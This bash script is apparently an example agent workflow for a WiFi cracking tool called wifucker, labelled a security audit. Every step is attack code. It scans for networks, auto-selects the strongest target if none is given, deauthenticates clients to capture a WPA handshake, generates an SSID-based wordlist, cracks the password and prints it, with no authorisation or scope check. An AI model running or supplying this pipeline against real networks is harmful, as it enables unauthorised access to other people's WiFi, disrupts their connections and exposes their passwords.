#!/bin/bash
#
# Example Agent Workflow Script
# Demonstrates automated WiFi security audit workflow
#

set -e

INTERFACE="${1:-wlan0}"
TARGET_SSID="${2:-}"

echo "[*] Starting automated WiFi audit workflow"
echo "[*] Interface: $INTERFACE"

# Step 1: Scan for networks
echo "[*] Step 1: Scanning for networks..."
SCAN_OUTPUT=$(wifucker scan "$INTERFACE" --duration 10 --json)

if ! echo "$SCAN_OUTPUT" | jq -e '.success' > /dev/null; then
    echo "[-] Scan failed"
    echo "$SCAN_OUTPUT" | jq '.error'
    exit 1
fi

NETWORK_COUNT=$(echo "$SCAN_OUTPUT" | jq -r '.data.count')
echo "[+] Found $NETWORK_COUNT networks"

# Step 2: Select target network
if [ -z "$TARGET_SSID" ]; then
    # Auto-select strongest signal
    TARGET_SSID=$(echo "$SCAN_OUTPUT" | jq -r '.data.networks[0].essid')
    echo "[+] Auto-selected target: $TARGET_SSID"
else
    echo "[+] Using specified target: $TARGET_SSID"
fi

# Step 3: Capture handshake
echo "[*] Step 2: Capturing handshake..."
MON_INTERFACE="${INTERFACE}mon"
CAPTURE_OUTPUT=$(wifucker capture "$MON_INTERFACE" \
    --target-ssid "$TARGET_SSID" \
    --capture-duration 60 \
    --deauth-count 5 \
    --json \
    --progress-file /tmp/capture_progress.json)

if ! echo "$CAPTURE_OUTPUT" | jq -e '.success' > /dev/null; then
    echo "[-] Capture failed"
    echo "$CAPTURE_OUTPUT" | jq '.error'
    exit 1
fi

PCAP_FILE=$(echo "$CAPTURE_OUTPUT" | jq -r '.data.pcap_file')
echo "[+] Handshake captured: $PCAP_FILE"

# Step 4: Parse handshake
echo "[*] Step 3: Parsing handshake..."
PARSE_OUTPUT=$(wifucker parse "$PCAP_FILE" --json)

if ! echo "$PARSE_OUTPUT" | jq -e '.success' > /dev/null; then
    echo "[-] Parse failed"
    echo "$PARSE_OUTPUT" | jq '.error'
    exit 1
fi

HANDSHAKE_COUNT=$(echo "$PARSE_OUTPUT" | jq -r '.data.handshake_count')
echo "[+] Verified $HANDSHAKE_COUNT handshake(s)"

# Step 5: Generate wordlist
echo "[*] Step 4: Generating wordlist..."
GENERATE_OUTPUT=$(wifucker generate "$TARGET_SSID" \
    --max-passwords 10000 \
    --json)

if ! echo "$GENERATE_OUTPUT" | jq -e '.success' > /dev/null; then
    echo "[-] Wordlist generation failed"
    echo "$GENERATE_OUTPUT" | jq '.error'
    exit 1
fi

WORDLIST_FILE=$(echo "$GENERATE_OUTPUT" | jq -r '.data.output_file')
echo "[+] Wordlist generated: $WORDLIST_FILE"

# Step 6: Crack password
echo "[*] Step 5: Cracking password..."
CRACK_OUTPUT=$(wifucker crack "$PCAP_FILE" "$WORDLIST_FILE" \
    --rules \
    --json \
    --progress-file /tmp/crack_progress.json)

if ! echo "$CRACK_OUTPUT" | jq -e '.success' > /dev/null; then
    echo "[-] Cracking failed"
    echo "$CRACK_OUTPUT" | jq '.error'
    exit 1
fi

FOUND=$(echo "$CRACK_OUTPUT" | jq -r '.data.found')
if [ "$FOUND" = "true" ]; then
    PASSWORD=$(echo "$CRACK_OUTPUT" | jq -r '.data.password')
    ATTEMPTS=$(echo "$CRACK_OUTPUT" | jq -r '.data.attempts')
    ELAPSED=$(echo "$CRACK_OUTPUT" | jq -r '.data.elapsed_time')
    
    echo ""
    echo "=========================================="
    echo "  PASSWORD FOUND!"
    echo "=========================================="
    echo "  SSID:     $TARGET_SSID"
    echo "  Password: $PASSWORD"
    echo "  Attempts: $ATTEMPTS"
    echo "  Time:     ${ELAPSED}s"
    echo "=========================================="
else
    echo "[-] Password not found in wordlist"
    echo "[*] Suggestions:"
    echo "    - Use a larger wordlist"
    echo "    - Try: wifucker download --all"
    exit 1
fi

echo ""
echo "[+] Workflow complete!"

